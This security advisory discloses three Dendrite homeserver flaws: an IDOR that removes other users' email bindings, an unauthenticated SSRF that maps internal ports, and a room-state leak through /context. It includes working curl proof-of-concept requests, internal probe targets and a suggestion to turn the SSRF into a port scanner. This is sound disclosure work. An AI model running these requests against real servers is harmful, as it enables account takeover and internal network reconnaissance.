https://github.com/matrix-org/dendrite - "This repository was archived by the owner on Nov 25, 2024. It is now read-only."

## Finding 1: IDOR in POST /account/3pid/delete allows any authenticated user to remove any other user's third-party identifier

Package: github.com/matrix-org/dendrite

Affected Versions: <=0.13.8 (latest release) and HEAD 0841813 (2024-11-25); all versions since the endpoint was introduced

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (6.5 Medium)

CWE: CWE-639 Authorization Bypass Through User-Controlled Key

### Summary

The Matrix Client-Server API endpoint `POST /_matrix/client/v3/account/3pid/delete` accepts an
email address (or phone number) and medium from the request body and unbinds that third-party
identifier from its associated local user account. The handler authenticates the caller, but
never checks that the supplied `address` actually belongs to the calling user. Any logged-in
user (including a low-privilege guest-promoted account) can therefore remove the email or MSISDN
binding from any other local user's account by submitting that user's address. After the binding
is removed, the victim loses password-reset capability through that 3PID, and the attacker, who
now controls an orphaned address record in the upstream identity server, can re-bind the same
address to their own account and use the homeserver's "reset password by email" flow to take over
the victim's account.

### Details

**Vulnerable handler:** `clientapi/routing/threepid.go` lines 213 to 235

```go
// Forget3PID implements POST /account/3pid/delete
func Forget3PID(req *http.Request, threepidAPI api.ClientUserAPI) util.JSONResponse {
    var body authtypes.ThreePID
    if reqErr := httputil.UnmarshalJSONRequest(req, &body); reqErr != nil {
        return *reqErr
    }

    if err := threepidAPI.PerformForgetThreePID(req.Context(), &api.PerformForgetThreePIDRequest{
        ThreePID: body.Address,   // attacker-controlled
        Medium:   body.Medium,    // attacker-controlled
    }, &struct{}{}); err != nil {
        ...
    }

    return util.JSONResponse{
        Code: http.StatusOK,
        JSON: struct{}{},
    }
}
```

The handler never references `device.UserID`, so the caller's identity is never compared against
the owner of the 3PID being deleted.

**Route registration:** `clientapi/routing/routing.go` lines 954 to 958

```go
v3mux.Handle("/account/3pid/delete",
    httputil.MakeAuthAPI("account_3pid", userAPI, func(req *http.Request, device *userapi.Device) util.JSONResponse {
        return Forget3PID(req, userAPI)   // device discarded
    }),
).Methods(http.MethodPost, http.MethodOptions)
```

`MakeAuthAPI` resolves `device` from the access token but `Forget3PID` does not receive it.

**Internal API:** `userapi/internal/user_api.go` lines 973 to 975

```go
func (a *UserInternalAPI) PerformForgetThreePID(ctx context.Context, req *api.PerformForgetThreePIDRequest, res *struct{}) error {
    return a.DB.RemoveThreePIDAssociation(ctx, req.ThreePID, req.Medium)
}
```

**Storage layer:** `userapi/storage/postgres/threepid_table.go` lines 55 to 56

```go
const deleteThreePIDSQL = "" +
    "DELETE FROM userapi_threepids WHERE threepid = $1 AND medium = $2"
```

The DELETE statement keys only on `threepid` and `medium`. The PRIMARY KEY of the
`userapi_threepids` table is `(threepid, medium)`, so the deletion always removes the single row
owned by whichever local user happens to be bound to that address. The owning `localpart` and
`server_name` columns are present in the schema but are not consulted.

The same SQL string appears in `userapi/storage/sqlite3/threepid_table.go` lines 55 to 56.

For comparison, the read path `GetAssociated3PIDs` (lines 181 to 211 in the same file) correctly
scopes its database query to `device.UserID`. Only the delete path is missing the owner check.

### PoC

1. Start a Dendrite instance.

2. Register two users.

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"auth":{"type":"m.login.dummy"},"username":"alice","password":"alicepass123"}' \
  http://target:8008/_matrix/client/v3/register
# => {"user_id":"@alice:localhost","access_token":"ALICE_TOKEN",...}

curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"auth":{"type":"m.login.dummy"},"username":"bob","password":"bobpass123"}' \
  http://target:8008/_matrix/client/v3/register
# => {"user_id":"@bob:localhost","access_token":"BOB_TOKEN",...}
```

3. Bind a 3PID to Bob (in a real environment this happens through the
   `/account/3pid/email/requestToken` flow with an identity server; for the PoC
   we insert the row directly to demonstrate the authorisation bug).

```bash
docker exec dendrite_postgres psql -U dendrite -d dendrite \
  -c "INSERT INTO userapi_threepids (threepid, medium, localpart, server_name)
      VALUES ('bob@example.com','email','bob','localhost');"
```

4. Confirm Bob owns the binding.

```bash
curl -s -H "Authorization: Bearer BOB_TOKEN" \
  http://target:8008/_matrix/client/v3/account/3pid
# => {"threepids":[{"address":"bob@example.com","medium":"email",...}]}
```

5. As Alice (a completely unrelated user), delete Bob's 3PID.

```bash
curl -s -X POST -H "Authorization: Bearer ALICE_TOKEN" -H 'Content-Type: application/json' \
  -d '{"address":"bob@example.com","medium":"email"}' \
  http://target:8008/_matrix/client/v3/account/3pid/delete
# => {}
```

6. Confirm Bob's 3PID is gone.

```bash
curl -s -H "Authorization: Bearer BOB_TOKEN" \
  http://target:8008/_matrix/client/v3/account/3pid
# => {"threepids":[]}
```

Validated live against commit 0841813 on 2026-05-26.

### Impact

This is a CWE-639 Insecure Direct Object Reference. Any authenticated local user can:

1. Enumerate or guess another user's email address, then unbind it by a single POST.
2. Remove every 3PID binding from every other user on the homeserver by iterating known
   addresses. There is no rate limit on the endpoint at the application layer
   (`Forget3PID` does not call `rateLimits.Limit`).
3. Permanently break account recovery for users that rely on their email for password
   reset (Synapse-compatible flows that lean on the 3PID binding).
4. Combine the deletion with a fresh "verify and bind" on the same email through an identity
   server to repoint the address to the attacker's account, then trigger Dendrite's standard
   "reset password by email" flow and take over the victim's account.

Severity: 6.5 Medium (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N). PR:L because any local
account is sufficient, even one that the attacker creates themselves on an open-registration
homeserver, raising the practical impact toward High in those deployments.


## Finding 2: Unauthenticated SSRF and internal port scanner via legacy /_matrix/media/r0/download

Package: github.com/matrix-org/dendrite

Affected Versions: <=0.13.8 (latest release) and HEAD 0841813 (2024-11-25)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (5.3 Medium)

CWE: CWE-918 Server-Side Request Forgery, with CWE-200 information exposure in the error path

### Summary

The legacy unauthenticated media download endpoint
`GET /_matrix/media/{r0,v1,v3}/download/{serverName}/{mediaId}` accepts an
arbitrary `serverName` and, when the media is not already cached locally, instructs
the federation client to fetch it from that server name. The federation server name
resolver in `gomatrixserverlib/fclient` accepts raw IP literals and arbitrary
`host:port` strings without any block-list or RFC1918 / loopback / metadata filtering,
so an unauthenticated attacker can force the Dendrite process to open outbound HTTPS
connections to any host and port reachable from the server's network namespace. The
JSON error response leaks the resolved internal IP address, which turns the endpoint
into a full unauthenticated internal port scanner and DNS resolver.

### Details

**Route registration (no auth wrapper):** `mediaapi/routing/routing.go` lines 99 to 105

```go
downloadHandler := makeDownloadAPI("download_unauthed", &cfg.MediaAPI, rateLimits, db,
    client, federationClient, activeRemoteRequests, activeThumbnailGeneration, false)
v3mux.Handle("/download/{serverName}/{mediaId}", downloadHandler)
v3mux.Handle("/download/{serverName}/{mediaId}/{downloadName}", downloadHandler)
```

`v3mux` is `routers.Media.PathPrefix("/{apiversion:(?:r0|v1|v3)}/").Subrouter()`. The
handler is wired directly without `MakeAuthAPI` or `WithAuth()`. This is intentional
for spec compatibility with pre-v1.11 Matrix clients, but the downstream code path
performs no SSRF mitigation.

**Outbound fetch:** `mediaapi/routing/download.go` lines 821 to 843

```go
func (r *downloadRequest) fetchRemoteFile(...) (...) {
    r.Logger.Debug("Fetching remote file")
    isAuthed := true
    resp, err := r.fedClient.DownloadMedia(ctx, r.origin, r.MediaMetadata.Origin, string(r.MediaMetadata.MediaID))
    if err != nil || (resp != nil && resp.StatusCode != http.StatusOK) {
        isAuthed = false
        resp, err = client.CreateMediaDownloadRequest(ctx, r.MediaMetadata.Origin, string(r.MediaMetadata.MediaID))
        if err != nil || (resp != nil && resp.StatusCode != http.StatusOK) {
            if resp != nil && resp.StatusCode == http.StatusNotFound {
                return "", false, fmt.Errorf("File with media ID %q does not exist on %s", r.MediaMetadata.MediaID, r.MediaMetadata.Origin)
            }
            return "", false, fmt.Errorf("file with media ID %q could not be downloaded from %s: %w", r.MediaMetadata.MediaID, r.MediaMetadata.Origin, err)
        }
    }
    ...
}
```

`r.MediaMetadata.Origin` is taken directly from the `{serverName}` path variable
(`mediaapi/routing/routing.go` lines 219 to 220). The only validation in
`mediaapi/routing/download.go` `Validate()` is "non-empty"; there is no host or IP
filtering.

**Resolver:** `gomatrixserverlib/fclient/resolve.go` lines 47 to 78

```go
func resolveServer(ctx context.Context, serverName spec.ServerName, checkWellKnown bool) (results []ResolutionResult, err error) {
    host, port, valid := spec.ParseAndValidateServerName(serverName)
    if !valid {
        err = fmt.Errorf("Invalid server name")
        return
    }
    if host[0] == '[' && host[len(host)-1] == ']' {
        host = host[1 : len(host)-1]
    }
    if net.ParseIP(host) != nil {
        var destination string
        if port == -1 {
            destination = net.JoinHostPort(host, strconv.Itoa(8448))
        } else {
            destination = string(serverName)
        }
        results = []ResolutionResult{ {Destination: destination, Host: serverName, TLSServerName: host} }
        return
    }
    if port != -1 {
        results = []ResolutionResult{ {Destination: string(serverName), Host: serverName, TLSServerName: host} }
        return
    }
    ...
}
```

No check against private ranges, loopback, link-local, multicast, IPv4-mapped IPv6,
or any allow / deny list. A request like
`GET /_matrix/media/r0/download/127.0.0.1:5432/anything` lands in the IP-literal
branch and the transport will dial `127.0.0.1:5432`. Hostnames go through DNS and
end up in the same dial, allowing internal hostname enumeration.

**Information leakage in the error path:** the error string includes the resolved
network address. Example responses observed during validation:

```
{"errcode":"M_NOT_FOUND","error":"Failed to download: file with media ID \"abc\" could
not be downloaded from postgres:5432: Get \"matrix://postgres:5432/_matrix/media/v3/
download/postgres:5432/abc?allow_remote=false\": EOF"}

{"errcode":"M_NOT_FOUND","error":"Failed to download: file with media ID \"abc\" could
not be downloaded from postgres:9999: Get \"matrix://postgres:9999/_matrix/media/v3/
download/postgres:9999/abc?allow_remote=false\": dial tcp 172.19.0.2:9999: connect:
connection refused"}

{"errcode":"M_NOT_FOUND","error":"Failed to download: File with media ID \"abc\" does
not exist on google.com:443"}
```

These four distinct outcomes (EOF on TLS, refused on closed port, "does not exist"
on an open TLS port that returned HTTP 404, and i/o timeout on an unreachable host)
are easily distinguishable and the responses leak the resolved IP address (Docker
internal `172.19.0.2` here). An unauthenticated attacker can:

- Scan the homeserver's internal network port by port.
- Resolve internal hostnames to IPs.
- Probe internal services that speak TLS (cloud metadata services on TLS-fronted
  proxies, internal admin panels behind HTTPS, etc).

The endpoint also feeds the per-source-IP rate limiter only (`rateLimits.Limit(req, nil)`
at line 209), which can be bypassed with rotating client IPs.

### PoC

1. Start a Dendrite instance (any version up to and including 0.13.8 / HEAD 0841813).
   The Docker Compose stack from `build/docker/docker-compose.yml` is sufficient,
   exposing port 8008 to the public.

2. Send unauthenticated probes from outside.

```bash
# Open port that speaks something other than TLS (Postgres on the internal network).
curl -s "http://target:8008/_matrix/media/r0/download/postgres:5432/anything"
# => "...: dial tcp <internal-ip>:5432: EOF"   -> port open, leaks internal IP

# Closed port.
curl -s "http://target:8008/_matrix/media/r0/download/postgres:9999/anything"
# => "...: dial tcp <internal-ip>:9999: connect: connection refused" -> port closed

# Open TLS port (reachable from server).
curl -s "http://target:8008/_matrix/media/r0/download/example.org:443/anything"
# => "File with media ID \"anything\" does not exist on example.org:443" -> open

# Loopback.
curl -s "http://target:8008/_matrix/media/r0/download/127.0.0.1:22/anything"
# Behaviour depends on what is listening on 127.0.0.1:22; same leak.
```

3. To weaponize as a port scanner, iterate IPs and ports in the local subnet and
   parse the error class.

Validated live against commit 0841813 on 2026-05-26.

### Impact

Type: CWE-918 SSRF, with CWE-200 information disclosure in the error path.

- Unauthenticated network reconnaissance from any source that can reach the
  Matrix client API. Public-facing dendrite servers can be used to map the
  operator's internal network and resolve internal hostnames to internal IPs.
- The forced outbound TLS connections go through the destination tripper, so
  the operator's egress firewall (which often permits arbitrary outbound TLS
  on 443 by default) does not filter them.
- The HTTPS-only transport limits direct read of plaintext internal services,
  but TLS-fronted internal services (metadata proxies, admin dashboards,
  staging deployments) can be probed for status codes.
- The legacy /_matrix/media/r0|v1|v3/download endpoint is unauthenticated for
  spec compatibility with pre-v1.11 Matrix clients, so this attack does not
  require any account, captcha, or rate-limit-survivable workflow.

Severity: 5.3 Medium (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).

Mitigation guidance: filter `serverName` in `mediaapi/routing/download.go` before
calling `fetchRemoteFile`, rejecting IP literals in private / loopback / link-local
ranges and rejecting resolved hostnames whose A/AAAA records fall into those ranges.
Strip the resolved address from the error message returned to the client.


## Finding 3: /context returns current room state to non-members and left users (history-visibility bypass)

Package: dendrite (syncapi/routing/context.go)

Affected Versions: confirmed on commit 0841813 (v0.13.x line, ~5.7k stars)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (5.3 Medium)

CWE: CWE-863 Incorrect Authorization (with CWE-200)

### Summary

The `/context` endpoint returns the room's current state with no membership or history-visibility filtering. The membership check degrades to "does this room exist on this server", and the requested event and timeline are history-visibility filtered while the `State` block is not. A local user who has left a private room (default `shared` history visibility) can therefore read state events created after they left, new topic/name/avatar and current member joins, which `/messages` and `/sync` correctly hide. Confirmed against the syncapi handler with the roomserver: a left user received a post-leave topic and a post-leave member join.

### Details

Sink: `syncapi/routing/context.go:200` `state, err := snapshot.CurrentState(ctx, roomID, &stateFilter, nil)`, placed verbatim into `response.State` (~240-247). `CurrentState` (`syncapi/storage/shared/storage_sync.go:88` -> `SelectCurrentState`) returns the room's current full state with no history-visibility/membership filtering.

Missing gate 1 (membership): `context.go:96-110` queries `QueryMembershipForUser` but only checks `membershipRes.RoomExists`. The available `IsInRoom`, `HasBeenInRoom`, and `Membership` fields (`roomserver/api/query.go:122-134`) are ignored, so the check degrades to room-exists. Missing gate 2 (state filtering): the requested event and the before/after timeline are filtered via `internal.ApplyHistoryVisibilityFilter` (~142, ~185), but the `State` block is not filtered at all (the code even carries a `// TODO: Get the state at the last event returned` on line 199).

Flow: an authenticated local user who has left a `shared`-visibility private room (or any authenticated user for a `world_readable` room) calls `GET /_matrix/client/v3/rooms/{roomID}/context/{eventID}` for an event they were legitimately allowed to see; this passes the lone gate (history-visibility on the requested event), and the handler returns `response.State` = the room's current state, including state events created after the attacker left (new `m.room.topic`/`name`/`avatar`, current `m.room.member` joins).

The boundary crossed is cross-user disclosure: a left/non-member user reads current private-room state. No federation, admin, or special config required.

### PoC
```
GET /_matrix/client/v3/rooms/{roomID}/context/{eventID}   (token of a user who has LEFT the room)
-> response.state includes post-leave topic/name/avatar + current member joins
```
(Also: any authenticated user for a world_readable room.)

### Live validation (syncapi handler + roomserver, in-process integration test)
Booted syncapi public routes over httptest with roomserver.NewInternalAPI + sqlite sync DB;
ingested signed events through the NATS->consumer pipeline (production Context + CurrentState path, unmodified).
Test modeled on repo's own TestContext/testHistoryVisibility harness.
Scenario: Alice creates default (shared) room; Bob invited->joins->sees probe msg->LEAVES; AFTER Bob leaves Alice sets
topic SECRET-TOPIC-SET-AFTER-BOB-LEFT and Charlie joins; Bob calls /context/{probeEventID}.
```
HTTP 200
LEAKED post-leave topic to LEFT user: {"content":{"topic":"SECRET-TOPIC-SET-AFTER-BOB-LEFT"},...,"type":"m.room.topic"}
LEAKED post-leave membership (Charlie joined): {"content":{"membership":"join"},...,"state_key":"@3:test","type":"m.room.member"}
State block returned to LEFT user Bob: 8 events
contrast OK: /messages does NOT leak the post-leave topic to the left user
```
(go test ./syncapi/ -run 'TestContextStateLeak/sqlite' -v ; FAIL line = the t.Errorf("VULN CONFIRMED") asserts firing; postgres subtest errors only b/c no local PG.)

```
GET /_matrix/client/v3/rooms/{roomID}/context/{eventID}   (token of a user who has LEFT the room)
-> response.state includes post-leave topic/name and current member joins
```

Validated by booting the syncapi public routes over `httptest` with the internal roomserver (`roomserver.NewInternalAPI`) and a sqlite sync DB, ingesting signed events through the NATS->consumer pipeline (production `Context` handler + `CurrentState` path, unmodified; one test file modeled on the repo's own `TestContext` harness). Scenario: Alice creates a default (`shared`) room; Bob is invited, joins, sees a probe message, then leaves; after Bob leaves, Alice sets topic `SECRET-TOPIC-SET-AFTER-BOB-LEFT` and Charlie joins; Bob (left) calls `/context/{probeEventID}`:

```
HTTP 200
LEAKED post-leave topic state event to a LEFT user: {"content":{"topic":"SECRET-TOPIC-SET-AFTER-BOB-LEFT"},...,"type":"m.room.topic"}
LEAKED post-leave membership (Charlie joined) to a LEFT user: {"content":{"membership":"join"},...,"state_key":"@3:test","type":"m.room.member"}
State block returned to LEFT user Bob: 8 events
contrast OK: /messages does NOT leak the post-leave topic to the left user
```

The built-in contrast against `/messages` confirms `/context` is the outlier.

### Impact

A local user who has left a private room (or any user for a world-readable room) reads current room state they should not see: post-leave topic/name/avatar changes and the current membership list (who is in the room now). Confidentiality-only disclosure across the membership boundary; `shared` is the Matrix default so reachability is broad.

### Remediation

Enforce membership in `Context`: reject when `!membershipRes.IsInRoom && !membershipRes.HasBeenInRoom`, and for left users scope results to their leave point, mirroring `messages.go`'s `getMembershipForUser` + `Membership == spec.Leave` handling. Pass the `State` events from `CurrentState` through `internal.ApplyHistoryVisibilityFilter` (or compute state at the last returned event, per the existing TODO on line 199) before returning them.

---
